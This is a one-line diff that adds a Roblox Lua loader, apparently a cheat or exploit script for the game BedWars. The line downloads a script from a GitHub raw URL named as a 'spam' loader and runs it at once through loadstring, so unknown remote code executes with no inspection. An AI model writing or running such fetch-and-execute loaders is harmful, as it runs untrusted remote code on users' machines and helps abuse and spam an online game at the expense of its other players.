@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/part-2-bedwars-spam3-gfttcekbnu2tek.lua"))()
